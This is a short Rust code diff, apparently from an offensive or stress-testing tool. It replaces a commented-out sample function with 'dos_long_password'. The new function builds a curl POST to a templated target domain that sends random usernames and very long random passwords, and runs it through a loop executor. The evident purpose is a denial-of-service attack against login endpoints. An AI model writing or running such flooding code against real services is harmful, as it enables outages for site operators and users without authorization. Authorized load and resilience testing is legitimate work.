@@ -98,7 +98,9 @@ pub fn plugin_file_compact(argsv: Vec<String>) -> i32 {
     return 0;
 }
 
-// pub fn sample(argsv: Vec<String>) -> i32 {
-//     let nuke = DataSet::from_str("name", "some.thing", "command --foo bar");
-//     return bob(nuke, argsv.clone());
-// }
+pub fn dos_long_password(argsv: Vec<String>, cmd: &str) -> i32 {
+    let cmd = "curl -X POST @@domain -H 'Content-Type: application/json' -d \
+        '{\"username\": \"random_user_\"$(openssl rand -base64 @@size),\
+        \"password\": \"random_password_\"$(openssl rand -base64 @@size)}'";
+    return lazy_exec_loop(argsv, cmd);
+}
